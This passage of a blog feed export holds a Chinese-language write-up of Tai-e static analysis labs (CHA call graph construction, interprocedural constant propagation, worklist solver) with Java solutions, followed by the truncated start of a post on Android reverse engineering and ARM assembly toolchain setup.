class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Resolves call targets (callees) of a call site via CHA.</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">private</span> Set&lt;JMethod&gt; <span class="hljs-title function_">resolve</span><span class="hljs-params">(Invoke callSite)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 维护结果集，就是Resolve中的 T</span><br>       Set&lt;JMethod&gt; possibleTarGet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>       <span class="hljs-comment">// methodRef包含了调用点所调用的目标方法的签名信息</span><br>       <span class="hljs-type">MethodRef</span> <span class="hljs-variable">methodRef</span> <span class="hljs-operator">=</span> callSite.getMethodRef();<br>       JMethod method;<br>       <span class="hljs-keyword">switch</span> (CallGraphs.getCallKind(callSite))&#123;<br>           <span class="hljs-keyword">case</span> STATIC:<br>           <span class="hljs-keyword">case</span> SPECIAL:<span class="hljs-comment">// 调用静态方法或者私有方法，直接dispathc寻找对应的方法</span><br>               method = dispatch(methodRef.getDeclaringClass(), methodRef.getSubsignature());<br>               <span class="hljs-comment">// 首先判定是否找到了对应的方法，如果找到了就将其加入到结果集中</span><br>               <span class="hljs-keyword">if</span>(method != <span class="hljs-literal">null</span>)<br>                   possibleTarGet.add(method);<br>               <span class="hljs-keyword">break</span>;<br>           <span class="hljs-keyword">case</span> VIRTUAL:<br>           <span class="hljs-keyword">case</span> INTERFACE:<span class="hljs-comment">// 调用虚方法或者接口方法，需要根据继承关系进行查找</span><br>               Queue&lt;JClass&gt; jClassQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();<br>               jClassQueue.add(methodRef.getDeclaringClass());<br>               <span class="hljs-keyword">while</span>(!jClassQueue.isEmpty())&#123;<br>                   <span class="hljs-type">JClass</span> <span class="hljs-variable">jClass</span> <span class="hljs-operator">=</span> jClassQueue.poll();<br>                   method = dispatch(jClass, methodRef.getSubsignature());<br>                   <span class="hljs-comment">// 如果找到了对应的方法，就将其加入到结果集中</span><br>                   <span class="hljs-keyword">if</span>(method != <span class="hljs-literal">null</span>)<br>                       possibleTarGet.add(method);<br>                   <span class="hljs-comment">// 将该类(jClass)的所有继承关系加入到队列中---&gt;不能保证jClass是一个类，而不是接口</span><br>                   jClassQueue.addAll(hierarchy.getDirectSubclassesOf(jClass));<br>                   jClassQueue.addAll(hierarchy.getDirectSubinterfacesOf(jClass));<br>                   jClassQueue.addAll(hierarchy.getDirectImplementorsOf(jClass));<br>               &#125;<br>               <span class="hljs-keyword">break</span>;<br>       &#125;<br>       <span class="hljs-keyword">return</span> possibleTarGet;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里主要是对于 <code>Resolve</code> 和 <code>Dispatch</code> 的矛盾之处的理解。在讲解<code>Dispatch</code>时，确定其第一个参数是接收对象的类型，也就是 <code>A a = new B()</code> 中的 <code>B</code>，但是 <code>Resolve</code> 的底层逻辑还是调用 Dispatch 来进行的，它调用的反而是声明对象的类型，也就是这里的 <code>A</code>，所以不可避免地，Dispatch 在CHA算法中不会再使用接收对象地类型了，而是按照声明对象地类型来进行查找的，这里主要是 SPECIAL，VIRTUAL，INTERFACE调用了 Dispatch，它们都是这样。</p><p>​这里也可以看出，对于 <code>jClassQueue</code> 中的每一个元素，Dispatch的参数 <code>jClass</code> 都是在改变的，但是第二个参数永远是 <code>methodRef.getSubsignature()</code>，这也印证了 Resolve 的算法流程(part2中的过程)。</p><h4 id="callgraph"><a class="markdownIt-Anchor" href="#callgraph"></a> CallGraph</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> CallGraph&lt;Invoke, JMethod&gt; <span class="hljs-title function_">buildCallGraph</span><span class="hljs-params">(JMethod entry)</span> &#123;<br>       <span class="hljs-type">DefaultCallGraph</span> <span class="hljs-variable">callGraph</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultCallGraph</span>();<br>       callGraph.addEntryMethod(entry);<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       Queue&lt;JMethod&gt; WorkList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();<br>       WorkList.add(entry);<br>       <span class="hljs-keyword">while</span>(!WorkList.isEmpty())&#123;<br>           <span class="hljs-type">JMethod</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> WorkList.poll();<br>           <span class="hljs-comment">// 添加为可达方法</span><br>           <span class="hljs-keyword">if</span>(callGraph.reachableMethods.contains(method)) <span class="hljs-keyword">continue</span>;<br>           callGraph.addReachableMethod(method);<br>           <span class="hljs-comment">// 遍历该方法的调用语句(通过方法中调用点来获取)，将调用的方法加入到队列中</span><br>           <span class="hljs-keyword">for</span>(Invoke callSite: callGraph.getCallSitesIn(method))&#123;<br>               Set&lt;JMethod&gt; possibleCallees = resolve(callSite);<br>               <span class="hljs-keyword">for</span>(JMethod callee : possibleCallees)&#123;<br>                   callGraph.addEdge(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Edge</span>&lt;&gt;(CallGraphs.getCallKind(callSite), callSite, callee));<br>                   WorkList.add(callee);<br>               &#125;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> callGraph;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是工作表法，主要是构建 CallGraph，所以只需要判断添加可达的调用方法即可，具体表现就是添加调用边来扩充调用图。这里没有分析过程内的CFG，应该也是和之前一样已经内置了，因为之前也没有去添加结点构成一个 CFG，而是直接拿来用了。</p><h2 id="过程间常量传播"><a class="markdownIt-Anchor" href="#过程间常量传播"></a> 过程间常量传播</h2><h3 id="analysis-2"><a class="markdownIt-Anchor" href="#analysis-2"></a> analysis</h3><ul><li><code>pascal.taie.analysis.graph.icfg.ICFGEdge</code><ul><li>该类是一个抽象类，它表示了 ICFG 中的边。这里主要就是分析它的四个子类，也就是会涉及的四种ICFG边，Normal Edge<code>、</code>CallToReturnEdge<code>、</code>CallEdge<code>、</code>ReturnEdge</li></ul></li></ul><h3 id="具体代码-2"><a class="markdownIt-Anchor" href="#具体代码-2"></a> 具体代码</h3><h4 id="代码总览-2"><a class="markdownIt-Anchor" href="#代码总览-2"></a> 代码总览</h4><p>​需要完成以下方法</p><ul><li><code>boolean transferCallNode(Stmt,CPFact,CPFact)</code></li><li><code>boolean transferNonCallNode(Stmt,CPFact,CPFact)</code></li><li><code>CPFact transferNormalEdge(NormalEdge,CPFact)</code></li><li><code>CPFact transferCallToReturnEdge(CallToReturnEdge,CPFact)</code></li><li><code>CPFact transferCallEdge(LocalEdge,CPFact)</code></li><li><code>CPFact transferReturnEdge(LocalEdge,CPFact)</code></li></ul><p>​这里就是对于不同的边进行处理，主要逻辑如下。针对不同特征的边，下面的公式处理也不相同。主要就是 CallEdge， CallToReturnEdge 和 ReturnEdge的逻辑复杂，其余更多就是简单的值传递。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="normal">I</mi><mi mathvariant="normal">N</mi></mrow><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>=</mo><munder><mo>⋃</mo><mtext>P a predecessor of B</mtext></munder><mi>t</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>s</mi><mi>f</mi><mi>e</mi><mi>r</mi><mi>E</mi><mi>d</mi><mi>g</mi><mi>e</mi><mo stretchy="false">(</mo><mi>P</mi><mo>→</mo><mi>B</mi><mo separator="true">,</mo><mrow><mi mathvariant="monospace">O</mi><mi mathvariant="monospace">U</mi><mi mathvariant="monospace">T</mi></mrow><mo stretchy="false">[</mo><mi>P</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathrm{IN}[B]=\bigcup_\text{P a predecessor of B}transferEdge(P\to B,\mathtt{OUT}[P])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathrm">I</span><span class="mord mathrm">N</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.488226em;vertical-align:-1.438221em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8478869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord mtight">P a predecessor of B</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">⋃</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.438221em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathtt">O</span><span class="mord mathtt">U</span><span class="mord mathtt">T</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><h4 id="transfercallnode"><a class="markdownIt-Anchor" href="#transfercallnode"></a> transferCallNode</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transferCallNode</span><span class="hljs-params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-keyword">return</span> out.copyFrom(in);<br>&#125;<br></code></pre></td></tr></table></figure><p>​过程间的<strong>调用点</strong>，详细的操作在调用方法内进行，调用点就是负责给出目标方法的信息使用的，不影响传递的值，所以输入什么就输出什么。</p><h4 id="transfernoncallnode"><a class="markdownIt-Anchor" href="#transfernoncallnode"></a> transferNonCallNode</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transferNonCallNode</span><span class="hljs-params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 过程间非调用点，使用常量分析的transferNode</span><br>       <span class="hljs-keyword">return</span> cp.transferNode(stmt, in, out);<br>   &#125;<br></code></pre></td></tr></table></figure><p>​过程间的非调用点，转为过程内的措施。cp是<code>ConstantPropagation</code> 类的字段，用来实现过程内传播逻辑。</p><h4 id="transfernormaledge"><a class="markdownIt-Anchor" href="#transfernormaledge"></a> transferNormalEdge</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> CPFact <span class="hljs-title function_">transferNormalEdge</span><span class="hljs-params">(NormalEdge&lt;Stmt&gt; edge, CPFact out)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// NormalEdge与过程间调用无关，经过transferNode后不发生改变</span><br>       <span class="hljs-keyword">return</span> out;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​Normal edge，就是值传递的作用，transferEdge(edge, fact) = fact</p><h4 id="transfercalltoreturnedge"><a class="markdownIt-Anchor" href="#transfercalltoreturnedge"></a> transferCallToReturnEdge</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> CPFact <span class="hljs-title function_">transferCallToReturnEdge</span><span class="hljs-params">(CallToReturnEdge&lt;Stmt&gt; edge, CPFact out)</span> &#123;<br>       <span class="hljs-comment">// TODO - finish me</span><br>       <span class="hljs-comment">// edge.getSource()返回的是这条边的源节点，即调用点</span><br>       <span class="hljs-type">Stmt</span> <span class="hljs-variable">callStmt</span> <span class="hljs-operator">=</span> edge.getSource();<br>       <span class="hljs-comment">// 如果调用点是方法调用语句(Invoke类型)</span><br>       <span class="hljs-keyword">if</span>(callStmt <span class="hljs-keyword">instanceof</span> Invoke callSite)&#123;<br>           <span class="hljs-type">Var</span> <span class="hljs-variable">var</span> <span class="hljs-operator">=</span>  callSite.getLValue();<br>           <span class="hljs-comment">// 删除掉调用点的左值，之后返回</span><br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">var</span> != <span class="hljs-literal">null</span>)&#123;<br>               <span class="hljs-type">CPFact</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> out.copy();<br>               tmp.remove(<span class="hljs-keyword">var</span>);<br>               <span class="hljs-keyword">return</span> tmp;<br>           &#125;<br>       &#125;<br>       <span class="hljs-comment">// 调用点不是方法调用语句，直接等同于transferNormalEdge</span><br>       <span class="hljs-keyword">return</span> out;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​调用点到下一条语句中的那条虚线，负责把左侧的变量删去，然后传递其余对调用方法无影响的变量。</p><h4 id="transfercalledge"><a class="markdownIt-Anchor" href="#transfercalledge"></a> transferCallEdge</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> CPFact <span class="hljs-title function_">transferCallEdge</span><span class="hljs-params">(CallEdge&lt;Stmt&gt; edge, CPFact callSiteOut)</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 这里如果不是方法调用语句，直接返回空值，即不起作用</span><br>       <span class="hljs-type">CPFact</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CPFact</span>();<br>       <span class="hljs-comment">// 查边的源节点是否是一个方法调用语句</span><br>       <span class="hljs-keyword">if</span>(edge.getSource() <span class="hljs-keyword">instanceof</span> Invoke callSite)&#123;<br>           <span class="hljs-comment">// 获取调用点的参数列表</span><br>           List&lt;Var&gt; args = callSite.getInvokeExp().getArgs();<br>           <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.size(); i++)&#123;<br>               <span class="hljs-comment">// 获取被调用方法的参数列表</span><br>               <span class="hljs-type">Var</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> edge.getCallee().getIR().getParam(i);<br>               <span class="hljs-comment">// 更新tmp中的参数信息</span><br>               tmp.update(param, callSiteOut.get(args.get(i)));<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> tmp;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​调用点到目标方法的那条边，主要的调用就是上面的逻辑，具体就是将实参中的值传递到对应的形参中去，所以这里使用 callSiteOut获取调用点 OUT 的参数，然后通过 update 将值赋予调用方法的参数中。这里需要关注 getIR()方法，这里有提示可以从 IR 类中获取方法的参数，且可以使用 API <code>JMethod.getIR()</code> 来获取一个方法的 IR。</p><p>​这个时候答案是可以出来的，但是我有疑问 <code>IR</code> 到底是什么，经过Lab2的了解，<code>pascal.taie.ir.IR</code>是Tai-e的IR的革新数据结构，它的每个实例储存了一个 Java 方法的各种信息，例如变量、参数、语句等等。但是我们一开始所知道的IR就是中间代码，难道不是理解为一个一个语句吗，这里的疑问就又会涉及到Lab1中提到的statement了。所以我认为这里的IR具体不再是指一个一个中间代码语句了，在这里它指的是一个方法中的各种信息(就例如IDA中一个函数会有一个CFG图，它所指代的就是这个图的相关信息)，它包含Stmt，JMethod，Param等，具体看源码，可以理解它是一个方法中间代码的指代，存储方法的相关信息用于获取具体的数值(例如参数，其中的语句等)</p><h4 id="transferreturnedge"><a class="markdownIt-Anchor" href="#transferreturnedge"></a> transferReturnEdge</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> CPFact <span class="hljs-title function_">transferReturnEdge</span><span class="hljs-params">(ReturnEdge&lt;Stmt&gt; edge, CPFact returnOut)</span> &#123;<br>        <span class="hljs-comment">// TODO - finish me</span><br>        <span class="hljs-comment">// 这里如果不是方法调用语句，直接返回空值，即不起作用</span><br>        <span class="hljs-type">CPFact</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CPFact</span>();<br>        <span class="hljs-keyword">if</span>(edge.getCallSite() <span class="hljs-keyword">instanceof</span> Invoke callSite)&#123;<br>            <span class="hljs-comment">// 获取调用点的左值</span><br>            <span class="hljs-type">Var</span> <span class="hljs-variable">var</span> <span class="hljs-operator">=</span> callSite.getLValue();<br>            <span class="hljs-comment">// 如果左值不为空，就将返回值加入到tmp中</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">var</span> != <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">Value</span> <span class="hljs-variable">retval</span> <span class="hljs-operator">=</span> Value.getUndef();<br>                <span class="hljs-comment">// 获取被调用函数的返回值</span><br>                <span class="hljs-keyword">for</span>(Var retvar: edge.getReturnVars())&#123;<span class="hljs-comment">//获取返回变量的名称，例如y</span><br>                    <span class="hljs-comment">// 使用过程内的meetValue函数进行合并</span><br>                    retval = cp.meetValue(retval, returnOut.get(retvar));<br>                    <span class="hljs-comment">// tmp放在里面，应对存在多个返回值的情况</span><br>                    tmp.update(<span class="hljs-keyword">var</span>, retval);<br>                &#125;<br>                <span class="hljs-comment">//tmp.update(var, retval);</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br><br><span class="hljs-comment">// 使用跌倒器修改</span><br>    Iterator&lt;Var&gt; iterator = edge.getReturnVars().iterator();<br>    <span class="hljs-keyword">if</span> (iterator.hasNext()) &#123;<br>        <span class="hljs-type">Var</span> <span class="hljs-variable">retvar</span> <span class="hljs-operator">=</span> iterator.next();<br>        retval = cp.meetValue(retval, returnOut.get(retvar));<br><br>    &#125;<br>    tmp.update(<span class="hljs-keyword">var</span>, retval);<br></code></pre></td></tr></table></figure><p>​这里因为调用点处的左值在调用方法时已经被删去了，所以需要从edge中获取调用点信息，进而获取到被删除的左值是什么，之后就是这里的关键 <code>edge.getReturnVars()</code>，它获取 <code>return</code> 后面的变量名称，然后再通过<code>returnOut.get(retvar)</code>根据变量名称获取数值，之后再进行 <code>tmp.update(var, retval)</code>进行更新。这里测试 getReturnVars只会有一个，那就是紧跟在return的变量名称。而returnOut会存在多个变量，这是方法内部遗传下来的。通过这种方法避免了其余变量对于返回值的干扰。</p><p>​但是之后又思考，如果getReturnVars只返回一个，那么还需要for循环做什么，后来更改去掉for循环，果然错了。这里首先觉得<code>Var retvar: edge.getReturnVars()</code> 可以获取到返回值<code>Collection&lt;Var&gt;</code> 的一个Var变量，如果直接使用就是一个Collection了，所以报错。后来就发现这里返回值多个是指对于if语句等条件语句，可能会产生多个return，又由于是静态分析，所以会将所有的返回值全部返回，由此产生了多个返回值，所以需要使用for循环挑出来。</p><p>​但是还存在一个问题，这里 <code>tmp.update(var, retval)</code> 在for循环外，所以它最后只会更新一个返回值，这样多个返回值的情况就会直接交汇到一起，这样返回值也乱了。但是我这里提交代码后，是可以通过远程样例的，那么我就认为它默认会处理调用方法来对返回值进行处理，使得最后只有一个返回值有效(这里可能就是只有一个返回值，上面使用迭代器只用第一个数值的案例通过了本地样例，所以上面去掉for循环只是写错了，也由此可以认为远程案例是只有一个返回值的)所以我觉得这个语句应该放在for循环内，这样可以考虑到每一个返回值，然后本地样例是可以过的。</p><h2 id="worklist-求解器"><a class="markdownIt-Anchor" href="#worklist-求解器"></a> Worklist 求解器</h2><h3 id="具体代码-3"><a class="markdownIt-Anchor" href="#具体代码-3"></a> 具体代码</h3><h4 id="代码总览-3"><a class="markdownIt-Anchor" href="#代码总览-3"></a> 代码总览</h4><p>​需要实现的方法</p><ul><li><code>void initialize()</code></li><li><code>void doSolve()</code></li></ul><h4 id="initialize"><a class="markdownIt-Anchor" href="#initialize"></a> initialize</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initialize</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-comment">/* TODO - finish me */</span><br>       <span class="hljs-comment">// 遍历icfg的所有节点进行初始化</span><br>       <span class="hljs-keyword">for</span>(Node node : icfg) &#123;<br>           result.setInFact(node, analysis.newInitialFact());<br>           result.setOutFact(node, analysis.newInitialFact());<br>       &#125;<br>       <span class="hljs-comment">// 遍历icfg的所有方法，将方法的入口节点的outFact设置为newBoundaryFact</span><br>       <span class="hljs-keyword">for</span>(Method method : icfg.entryMethods().toList())&#123;<br>           <span class="hljs-type">Node</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> icfg.getEntryOf(method);<br>           result.setOutFact(entry, analysis.newBoundaryFact(entry));<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里与 Lab2 的不同就在于对于每个方法的入口结点的初始化。感觉不同之处在于它不需要对于 Entry 的 In 进行初始化了。之前我理解这里的初始化就是添加所有的键值对，以防止之后出现空指针的情况。而这里不加这个语句，有个猜想是因为这里是不同的方法，对于main方法之外的方法，它的键值对是由调用点传递的，所以不需要进行初始化。然后对于main方法，它可能自己已经初始化了，所以不需要再初始化了(后面的存疑，没有什么判断证据，只是猜想)。</p><p>​这里对 Lab2 的代码进行修改，Lab2 也不需要对入口结点进行初始化了，它是因为在WorkList中没有添加初始结点，所以不需要进行初始化了。而这里的初始化过程加入了初始节点，但是没有进行初始化就可以运行，所以沿用我上面的猜想。</p><h4 id="dosolve"><a class="markdownIt-Anchor" href="#dosolve"></a> doSolve</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSolve</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-comment">// TODO - finish me</span><br>       workList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SetQueue</span>&lt;&gt;();<br>       <span class="hljs-comment">// 将所有的方法的入口节点加入到workList中</span><br>       workList.addAll(icfg.getNodes());<br>       <span class="hljs-keyword">while</span>(!workList.isEmpty())&#123;<br>           <span class="hljs-type">Node</span> <span class="hljs-variable">BasicNode</span> <span class="hljs-operator">=</span> workList.poll();<br>           <span class="hljs-type">Fact</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> result.getInFact(BasicNode);<br>           <span class="hljs-type">Fact</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> result.getOutFact(BasicNode);<br>           <span class="hljs-comment">// 对于每一个入边，将其meet到in中</span><br>           <span class="hljs-keyword">for</span>(ICFGEdge&lt;Node&gt; inEdge: icfg.getInEdgesOf(BasicNode))&#123;<br>               analysis.meetInto(analysis.transferEdge(inEdge, result.getOutFact(inEdge.getSource())), in);<br>           &#125;<br><br>           <span class="hljs-keyword">if</span>(analysis.transferNode(BasicNode, in, out))&#123;<br>               workList.addAll(icfg.getSuccsOf(BasicNode));<br>           &#125;<br><br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里主要更改的还是每个 BB 之间边的关系，BB内部的转移方程没有改变。所以这里和 Lab2 进行比对，很容易发现就是将meet操作转化为四种边情况的操作，这样根据边的不同区分出不同的meet操作。</p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门(4)</title>
    <link href="/posts/f34fcec2.html"/>
    <url>/posts/f34fcec2.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Arm汇编</p></blockquote><h1 id="environment-setup"><a class="markdownIt-Anchor" href="#environment-setup"></a> Environment setup</h1><h2 id="set-tools"><a class="markdownIt-Anchor" href="#set-tools"></a> Set tools</h2><ol><li>download the ndk</li><li>find the path of <code>~/environment/android-ndk-r24/toolchains/llvm/prebuilt/linux-x86_64/bin</code></li><li>add the path command which is <code>export PATH=~/...../bin:$PATH</code> to <code>~/.bashrc</code></li></ol><h2 id="how-to-use-clang"><a class="markdownIt-Anchor" href="#how-to-use-clang"></a> How to use clang</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">clang -target 